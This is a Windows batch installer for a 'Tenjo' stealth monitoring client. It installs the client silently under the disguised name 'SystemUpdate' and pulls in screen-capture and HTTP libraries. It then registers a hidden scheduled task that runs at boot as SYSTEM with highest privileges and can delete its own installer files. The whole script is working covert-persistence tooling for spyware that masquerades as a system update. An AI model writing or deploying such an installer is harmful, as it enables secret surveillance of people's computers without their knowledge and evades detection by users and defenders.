@echo off
setlocal enabledelayedexpansion

:: Tenjo Stealth Installer for Windows
:: This script installs the monitoring client completely silently
:: The client will run hidden and auto-start on boot

:: Configuration
set APP_NAME=SystemUpdate
set INSTALL_DIR=%APPDATA%\SystemUpdate
set SERVICE_NAME=SystemUpdateService
set PYTHON_REQUIREMENTS=requests mss psutil pillow

:: Silent mode check
set SILENT=%1
if "%SILENT%"=="" set SILENT=false

:: Admin check
net session >nul 2>&1
if %errorLevel% == 0 (
    set INSTALL_DIR=%PROGRAMDATA%\SystemUpdate
    set ADMIN_MODE=true
) else (
    set ADMIN_MODE=false
)

if not "%SILENT%"=="true" (
    echo [INFO] Installing System Update Service...
)

:: Stop existing service if running
taskkill /F /IM "stealth_main.exe" >nul 2>&1
taskkill /F /IM "python.exe" /FI "WINDOWTITLE eq SystemUpdate*" >nul 2>&1
schtasks /End /TN "%SERVICE_NAME%" >nul 2>&1
schtasks /Delete /TN "%SERVICE_NAME%" /F >nul 2>&1

:: Create installation directory
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
if not exist "%INSTALL_DIR%\logs" mkdir "%INSTALL_DIR%\logs"

:: Copy application files
if not "%SILENT%"=="true" echo [INFO] Installing application files...
xcopy /E /I /Y . "%INSTALL_DIR%" >nul

:: Install Python dependencies
if not "%SILENT%"=="true" echo [INFO] Installing Python dependencies...
python -m pip install --user --quiet %PYTHON_REQUIREMENTS% >nul 2>&1
if errorlevel 1 (
    python -m pip install --quiet %PYTHON_REQUIREMENTS% >nul 2>&1
)

:: Create stealth main script
if not "%SILENT%"=="true" echo [INFO] Configuring stealth service...

(
echo import sys
echo import os
echo import subprocess
echo import time
echo import signal
echo import logging
echo from pathlib import Path
echo.
echo # Set up logging
echo log_dir = Path^(__file__^).parent / "logs"
echo log_dir.mkdir^(exist_ok=True^)
echo.
echo logging.basicConfig^(
echo     level=logging.INFO,
echo     format='%%^(asctime^)s - %%^(levelname^)s - %%^(message^)s',
echo     handlers=[
echo         logging.FileHandler^(log_dir / "stealth.log"^),
echo     ]
echo ^)
echo.
echo def main^(^):
echo     # Change to app directory
echo     app_dir = Path^(__file__^).parent
echo     os.chdir^(app_dir^)
echo     
echo     logging.info^("Starting stealth monitoring service..."^)
echo     
echo     try:
echo         # Import and run main application
echo         sys.path.insert^(0, str^(app_dir^)^)
echo         import main
echo         main.main^(^)
echo     except Exception as e:
echo         logging.error^("Application error: %%s", e^)
echo         time.sleep^(60^)  # Wait before restart
echo         sys.exit^(1^)
echo.
echo if __name__ == "__main__":
echo     main^(^)
) > "%INSTALL_DIR%\stealth_main.py"

:: Create Windows service using Task Scheduler
if not "%SILENT%"=="true" echo [INFO] Setting up auto-start service...

:: Create task that runs at startup and stays hidden
schtasks /Create /TN "%SERVICE_NAME%" /TR "python \"%INSTALL_DIR%\stealth_main.py\"" /SC ONSTART /RU "SYSTEM" /RL HIGHEST /F >nul 2>&1

if errorlevel 1 (
    :: Fallback: create user-level task
    schtasks /Create /TN "%SERVICE_NAME%" /TR "python \"%INSTALL_DIR%\stealth_main.py\"" /SC ONLOGON /F >nul 2>&1
)

:: Start the service immediately
if not "%SILENT%"=="true" echo [INFO] Starting service...
schtasks /Run /TN "%SERVICE_NAME%" >nul 2>&1

:: Clean up installation files if requested
if "%2"=="cleanup" (
    del /F /Q "%INSTALL_DIR%\install_stealth_windows.bat" >nul 2>&1
    del /F /Q "%INSTALL_DIR%\uninstall_stealth_windows.bat" >nul 2>&1
)

if not "%SILENT%"=="true" (
    echo [SUCCESS] System Update Service installed successfully
    echo [INFO] Installed at: %INSTALL_DIR%
    echo [INFO] Service will auto-start on boot
    echo.
    echo The service is now running silently in the background.
    echo To uninstall, run: "%INSTALL_DIR%\uninstall_stealth_windows.bat"
)

endlocal
